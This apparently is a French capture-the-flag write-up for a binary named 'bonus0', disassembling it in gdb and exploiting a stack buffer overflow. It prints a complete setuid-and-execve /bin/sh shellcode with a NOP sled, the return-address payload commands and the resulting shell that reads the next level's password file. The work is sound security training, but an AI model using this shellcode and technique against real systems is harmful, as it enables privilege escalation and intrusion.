@@ -1,0 +1,146 @@
+Nous sommes en presence d'un binaire bonus0 qui prend en parametres deux chaines sur l'entree standard, les concatene et affiche le resultat sur le sortie standard.
+
+Desassemblons le programme : 
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080485a4 <+0>:	push   %ebp
+   0x080485a5 <+1>:	mov    %esp,%ebp
+   0x080485a7 <+3>:	and    $0xfffffff0,%esp
+   0x080485aa <+6>:	sub    $0x40,%esp
+   0x080485ad <+9>:	lea    0x16(%esp),%eax
+   0x080485b1 <+13>:	mov    %eax,(%esp)
+   0x080485b4 <+16>:	call   0x804851e <pp>
+   0x080485b9 <+21>:	lea    0x16(%esp),%eax
+   0x080485bd <+25>:	mov    %eax,(%esp)
+   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
+   0x080485c5 <+33>:	mov    $0x0,%eax
+   0x080485ca <+38>:	leave
+   0x080485cb <+39>:	ret
+End of assembler dump.
+(gdb) disas pp
+Dump of assembler code for function pp:
+   0x0804851e <+0>:	push   %ebp
+   0x0804851f <+1>:	mov    %esp,%ebp
+   0x08048521 <+3>:	push   %edi
+   0x08048522 <+4>:	push   %ebx
+   0x08048523 <+5>:	sub    $0x50,%esp
+   0x08048526 <+8>:	movl   $0x80486a0,0x4(%esp)
+   0x0804852e <+16>:	lea    -0x30(%ebp),%eax
+   0x08048531 <+19>:	mov    %eax,(%esp)
+   0x08048534 <+22>:	call   0x80484b4 <p>
+   0x08048539 <+27>:	movl   $0x80486a0,0x4(%esp)
+   0x08048541 <+35>:	lea    -0x1c(%ebp),%eax
+   0x08048544 <+38>:	mov    %eax,(%esp)
+   0x08048547 <+41>:	call   0x80484b4 <p>
+   0x0804854c <+46>:	lea    -0x30(%ebp),%eax
+   0x0804854f <+49>:	mov    %eax,0x4(%esp)
+   0x08048553 <+53>:	mov    0x8(%ebp),%eax
+   0x08048556 <+56>:	mov    %eax,(%esp)
+   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
+   0x0804855e <+64>:	mov    $0x80486a4,%ebx
+   0x08048563 <+69>:	mov    0x8(%ebp),%eax
+   0x08048566 <+72>:	movl   $0xffffffff,-0x3c(%ebp)
+   0x0804856d <+79>:	mov    %eax,%edx
+   0x0804856f <+81>:	mov    $0x0,%eax
+   0x08048574 <+86>:	mov    -0x3c(%ebp),%ecx
+   0x08048577 <+89>:	mov    %edx,%edi
+   0x08048579 <+91>:	repnz scas %es:(%edi),%al
+   0x0804857b <+93>:	mov    %ecx,%eax
+   0x0804857d <+95>:	not    %eax
+   0x0804857f <+97>:	sub    $0x1,%eax
+   0x08048582 <+100>:	add    0x8(%ebp),%eax
+   0x08048585 <+103>:	movzwl (%ebx),%edx
+   0x08048588 <+106>:	mov    %dx,(%eax)
+   0x0804858b <+109>:	lea    -0x1c(%ebp),%eax
+   0x0804858e <+112>:	mov    %eax,0x4(%esp)
+   0x08048592 <+116>:	mov    0x8(%ebp),%eax
+   0x08048595 <+119>:	mov    %eax,(%esp)
+   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
+   0x0804859d <+127>:	add    $0x50,%esp
+   0x080485a0 <+130>:	pop    %ebx
+   0x080485a1 <+131>:	pop    %edi
+   0x080485a2 <+132>:	pop    %ebp
+   0x080485a3 <+133>:	ret
+End of assembler dump.
+(gdb) disas p
+Dump of assembler code for function p:
+   0x080484b4 <+0>:	push   %ebp
+   0x080484b5 <+1>:	mov    %esp,%ebp
+   0x080484b7 <+3>:	sub    $0x1018,%esp
+   0x080484bd <+9>:	mov    0xc(%ebp),%eax
+   0x080484c0 <+12>:	mov    %eax,(%esp)
+   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
+   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
+   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
+   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
+   0x080484da <+38>:	movl   $0x0,(%esp)
+   0x080484e1 <+45>:	call   0x8048380 <read@plt>
+   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
+   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
+   0x080484f4 <+64>:	mov    %eax,(%esp)
+   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
+=> 0x080484fc <+72>:	movb   $0x0,(%eax)
+   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
+   0x08048505 <+81>:	movl   $0x14,0x8(%esp)
+   0x0804850d <+89>:	mov    %eax,0x4(%esp)
+   0x08048511 <+93>:	mov    0x8(%ebp),%eax
+   0x08048514 <+96>:	mov    %eax,(%esp)
+   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
+   0x0804851c <+104>:	leave
+   0x0804851d <+105>:	ret
+End of assembler dump.
+
+Apres plusieurs essais nous remarquons que le programme segfault a partir de 20 caracteres et que le registre eip est ecrase a partir de l'offset 10 du deuxieme read : 
+
+(gdb) r < <(python -c 'print "A" * 20'; python -c 'print "AAAABBBBC\x90\x90\x90\x90DDDEEEEFFFF"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/bonus0/bonus0 < <(python -c 'print "A" * 30'; python -c 'print "AAAABBBBC\x90\x90\x90\x90DDDEEEEFFFF"')
+ -
+ -
+AAAAAAAAAAAAAAAAAAAAAAAABBBBC����DDDEEEE�� AAAABBBBC����DDDEEEE��
+
+Program received signal SIGSEGV, Segmentation fault.
+0x90909090 in ?? ()
+
+Essayons en envoyant l'adresse d'un shellcode present dans une variable d'environnement
+
+Hors gdb : 
+
+export EGG=`python -c 'print "\x31\xc0\x31\xdb\x31\xd2\x53\x68\x55\x6e\x69\x0a\x68\x64\x55\x55\x4d\x68\x41\x68\x6d\x61\x89\xe1\xb2\x0f\xb0\x04\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
+
+Puis dans gdb essayons de lancer l'exploit. Il va nous falloir trouver l'adresse de la variable d'environnement : 
+gdb -q bonus0
+x/10s *((char **)environ)
+=> 0xbffff8e9:	 "EGG=1\300\061\333\061\322ShUni\nhdUUMhAhma\211\341\262\017\260\004̀1\300\061\333\061ɰ\027̀1\300Phn/shh//bi\211\343\215T$\bPS\215\f$\260\v̀1\300\260\001̀"
+
+Adaptons notre exploit : 
+(gdb) r < <(python -c 'print "A" * 100'; python -c 'print "A" * 9 + "\xe9" + "\xf8" +"\xff" +"\xbf" + "B" * 7')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/bonus0/bonus0 < <(python -c 'print "A" * 100'; python -c 'print "A" * 9 + "\xe9" + "\xf8" +"\xff" +"\xbf" + "B" * 7')
+ -
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA����BBBBBBB�� AAAAAAAAA����BBBBBBB��
+process 3295 is executing new program: /bin/dash
+[Inferior 1 (process 3295) exited normally]
+
+On remarque bien l'execution d'un nouveau programme /bin/dash
+
+Cependant hors gdb cela ne marche pas, surement du a un decalage avec les adresses. Essayons alors de rajouter des NOP au debut de notre shellcode pour pallier a ce probleme : 
+
+export EGG=`python -c 'print "\x90" * 100 + "\x31\xc0\x31\xdb\x31\xd2\x53\x68\x55\x6e\x69\x0a\x68\x64\x55\x55\x4d\x68\x41\x68\x6d\x61\x89\xe1\xb2\x0f\xb0\x04\xcd\x80\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
+
+(python -c 'print "A" * 100'; python -c 'print "A" * 9 + "\xe9" + "\xf8" +"\xff" +"\xbf" + "B" * 7'; cat ) | ./bonus0
+ -
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA����BBBBBBB�� AAAAAAAAA����BBBBBBB��
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+Nous sommes bien log comme bonus1 et nous obtenons le flag
+
